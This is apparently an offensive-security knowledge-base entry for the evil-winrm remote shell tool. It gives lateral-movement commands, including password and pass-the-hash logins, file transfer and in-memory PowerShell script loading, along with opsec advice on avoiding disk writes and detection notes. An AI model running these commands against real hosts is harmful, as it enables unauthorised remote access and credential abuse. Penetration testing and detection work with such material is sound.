---
name: evil-winrm
category: lateral-movement
subcategories: [winrm, remote-shell, lateral-movement, ruby]
tradecraft_tags: [winrm, remote-shell, lateral-movement, ruby, linux-side, pass-the-hash, kerberos]
mitre_attack:
  - id: T1021.006
    name: Remote Services — Windows Remote Management
source:
  url: https://github.com/Hackplayers/evil-winrm
  license: MIT
  maintained: true
binary_type: python-script
binary_filename: evil-winrm.rb
supported_os: [linux]
architecture: [x64]
privilege_required: local-admin
network_required: true
detection_signal: |
  WinRM connections generate Event 4624 (logon type 8 — network cleartext or type 3)
  on the target and wsmprovhost.exe process creation. WinRM connections from unexpected
  source IPs are anomalous. WinRM-based lateral movement is less commonly detected
  than SMB-based methods but still generates distinct events.
usage_examples:
  - description: Interactive WinRM shell with password
    args: "evil-winrm -i 192.168.56.22 -u administrator -p Password123"
  - description: WinRM with NTLM hash (pass-the-hash)
    args: "evil-winrm -i 192.168.56.22 -u administrator -H nthash"
  - description: WinRM with SSL
    args: "evil-winrm -i 192.168.56.22 -u administrator -p Password123 -S"
  - description: Upload/download files via WinRM
    args: "(evil-winrm shell) upload /local/path /remote/path"
  - description: Load PowerShell scripts directly
    args: "evil-winrm -i HOST -u user -p pass -s /local/scripts/ (then: menu, Invoke-Seatbelt.ps1)"
opsec_notes: |
  Evil-WinRM is a Ruby tool — infrastructure side (Linux). The key operational advantage:
  built-in file transfer and PS script loading without disk writes on the target.
  WinRM lateral movement is quieter than PSExec/SMBExec (no service install) but
  wsmprovhost.exe still creates process events. Pass-the-hash via WinRM is well-supported.
gotchas: |
  Ruby tool — not Apollo-runnable. WinRM must be enabled on target (disabled by default
  on non-servers in older Windows; enabled by default on Server 2008 R2+). Port TCP 5985
  (HTTP) or 5986 (HTTPS) must be reachable. Evil-WinRM's PS script loading feature
  (`-s /local/scripts/`) is particularly useful: scripts are loaded into memory on demand
  without disk writes.
related_ttps: [impacket-wmiexec, crackmapexec, sharpexec, pass-the-hash]
alternatives: [sharpexec-winrm, crackmapexec-winrm]
common_args:
  -i:
    description: Target IP or hostname
    typical_values: ["192.168.56.22", "WINTERFELL"]
    required: true
  -u:
    description: Username
    typical_values: ["administrator"]
    required: true
  -p:
    description: Password
    typical_values: ["Password123"]
  -H:
    description: NTLM hash for pass-the-hash
    typical_values: ["<nthash>"]
  -S:
    description: Use HTTPS/SSL
    typical_values: [flag-only]
  -s:
    description: Local directory containing PS scripts to load on demand
    typical_values: ["/tmp/scripts/"]
last_updated: 2026-05-29
---

# evil-winrm

A Ruby-based WinRM interactive shell with built-in file transfer, PowerShell script
loading, and NTLM hash support. Evil-WinRM provides an interactive shell over WinRM
from Linux attack infrastructure, making it the preferred tool for WinRM-based lateral
movement when working from Linux.

## Typical use cases
- Interactive shell on Windows targets via WinRM (quieter than SMB/service-based methods)
- Pass-the-hash lateral movement when hash is available but no shell exists
- Load PowerShell scripts directly into memory on the remote host (no disk write)

## PS Script Loading Feature

Evil-WinRM can load PS scripts from a local directory without writing them to disk:
```
# Start with script directory:
evil-winrm -i TARGET -u user -p pass -s /tmp/ps-scripts/

# In the shell, load scripts on demand:
Invoke-Seatbelt.ps1
SharpHound.ps1
# These execute in memory — no disk write on the target
```

## Apollo-specific note
Ruby/Linux-only. For Apollo: use SharpExec with winrm action, or SharpMapExec.
